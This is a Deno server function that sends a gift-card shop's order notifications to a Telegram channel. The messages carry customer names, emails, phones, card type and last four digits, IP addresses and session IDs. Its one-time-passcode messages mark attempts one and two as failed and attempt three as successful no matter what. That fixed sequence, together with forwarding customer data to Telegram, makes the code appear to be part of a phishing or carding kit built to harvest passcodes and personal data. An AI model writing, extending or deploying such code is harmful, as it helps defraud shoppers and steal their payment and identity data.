
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const TELEGRAM_CHANNEL_ID = Deno.env.get("TELEGRAM_CHANNEL_ID");

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface OrderDetails {
  customerName: string;
  email: string;
  phone: string;
  giftCardValue: number;
  paymentAmount: number;
  deliveryMethod: string;
  cryptoCurrency: string;
  transactionId: string;
  ip?: string;
  userAgent?: string;
  sessionId?: string;
  notificationType?: string;
  otpAttempt?: number;
  cardDetails?: {
    cardType: string;
    lastFour: string;
  };
}

function formatInitialOrderMessage(orderDetails: OrderDetails): string {
  return `
🔰 *NEW ORDER NOTIFICATION* 🔰
🏷️ *Type:* Initial Order Placement

👤 *Customer*: ${orderDetails.customerName}
📧 *Email*: ${orderDetails.email}
📱 *Phone*: ${orderDetails.phone}

💳 *Gift Card Value*: $${orderDetails.giftCardValue.toFixed(2)}
💰 *Payment Amount*: $${orderDetails.paymentAmount.toFixed(2)}
🪙 *Cryptocurrency*: ${orderDetails.cryptoCurrency}

🚚 *Delivery Method*: ${orderDetails.deliveryMethod}
🔢 *Transaction ID*: \`${orderDetails.transactionId}\`

📆 *Date*: ${new Date().toLocaleString()}

📱 *Device Info*:
IP: ${orderDetails.ip || 'Unknown'}
Browser: ${orderDetails.userAgent ? orderDetails.userAgent.substring(0, 100) : 'Unknown'}
Session: ${orderDetails.sessionId || 'Unknown'}
`;
}

function formatPaymentDetailsMessage(orderDetails: OrderDetails): string {
  if (!orderDetails.cardDetails) {
    return "⚠️ *No card details provided*";
  }
  
  return `
💳 *PAYMENT DETAILS NOTIFICATION* 💳
🏷️ *Type:* Card Information Provided

👤 *Customer*: ${orderDetails.customerName}
📧 *Email*: ${orderDetails.email}
📱 *Phone*: ${orderDetails.phone}

💳 *Card Type*: ${orderDetails.cardDetails.cardType || 'Unknown'}
🔢 *Last Four*: ${orderDetails.cardDetails.lastFour || 'Unknown'}
💰 *Amount*: $${orderDetails.paymentAmount.toFixed(2)}
🎁 *Gift Card Value*: $${orderDetails.giftCardValue.toFixed(2)}

📆 *Date*: ${new Date().toLocaleString()}

📱 *Device Info*:
IP: ${orderDetails.ip || 'Unknown'}
Browser: ${orderDetails.userAgent ? orderDetails.userAgent.substring(0, 100) : 'Unknown'}
Session: ${orderDetails.sessionId || 'Unknown'}
`;
}

function formatOTPAttemptMessage(orderDetails: OrderDetails): string {
  const attempt = orderDetails.otpAttempt || 0;
  const isLastAttempt = attempt === 3;
  const attemptEmoji = isLastAttempt ? '✅' : '🔄';
  const attemptStatus = isLastAttempt ? 'SUCCESSFUL (FINAL ATTEMPT)' : `FAILED (ATTEMPT ${attempt}/3)`;
  const headerColor = isLastAttempt ? '*GREEN*' : '*RED*';
  
  return `
${attemptEmoji} *OTP VERIFICATION ${attemptStatus}* ${attemptEmoji}
🏷️ *Type:* OTP Attempt ${attempt}/3 - ${headerColor}

👤 *Customer*: ${orderDetails.customerName}
📧 *Email*: ${orderDetails.email}
📱 *Phone*: ${orderDetails.phone}

💳 *Card Type*: ${orderDetails.cardDetails?.cardType || 'Unknown'}
🔢 *Last Four*: ${orderDetails.cardDetails?.lastFour || 'Unknown'}
💰 *Amount*: $${orderDetails.paymentAmount.toFixed(2)}

${isLastAttempt ? '✅ *PAYMENT AUTHORIZED*' : '⚠️ *Verification Failed*'}

📆 *Date*: ${new Date().toLocaleString()}

📱 *Device Info*:
IP: ${orderDetails.ip || 'Unknown'}
Browser: ${orderDetails.userAgent ? orderDetails.userAgent.substring(0, 100) : 'Unknown'}
Session: ${orderDetails.sessionId || 'Unknown'}
`;
}

function formatTelegramMessage(orderDetails: OrderDetails): string {
  const type = orderDetails.notificationType || "order";
  
  switch (type) {
    case "initial_order":
      return formatInitialOrderMessage(orderDetails);
    case "payment_details":
      return formatPaymentDetailsMessage(orderDetails);
    case "otp_attempt":
      return formatOTPAttemptMessage(orderDetails);
    default:
      // Fallback to original format for backward compatibility
      return formatInitialOrderMessage(orderDetails);
  }
}

async function sendTelegramNotification(message: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHANNEL_ID) {
    console.error("Missing Telegram configuration - Bot Token or Channel ID not set");
    return false;
  }

  try {
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    console.log(`Sending message to Telegram channel: ${TELEGRAM_CHANNEL_ID}`);
    
    const response = await fetch(telegramApiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHANNEL_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    const data = await response.json();
    
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return false;
    }
    
    console.log("Telegram notification sent successfully:", data.result);
    return true;
  } catch (error) {
    console.error("Error sending Telegram notification:", error);
    return false;
  }
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const orderDetails: OrderDetails = await req.json();
    console.log("Received details for Telegram notification:", orderDetails);
    
    // Format the message for Telegram
    const message = formatTelegramMessage(orderDetails);
    console.log("Formatted Telegram message:", message);
    
    // Send the notification
    const success = await sendTelegramNotification(message);
    
    if (!success) {
      console.error("Failed to send Telegram notification");
      return new Response(
        JSON.stringify({ success: false, error: "Failed to send Telegram notification" }),
        {
          status: 500,
          headers: { "Content-Type": "application/json", ...corsHeaders },
        }
      );
    }

    console.log("Telegram notification sent successfully");
    return new Response(
      JSON.stringify({ success: true }),
      {
        status: 200,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  } catch (error) {
    console.error("Error processing request:", error);
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      {
        status: 500,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  }
});
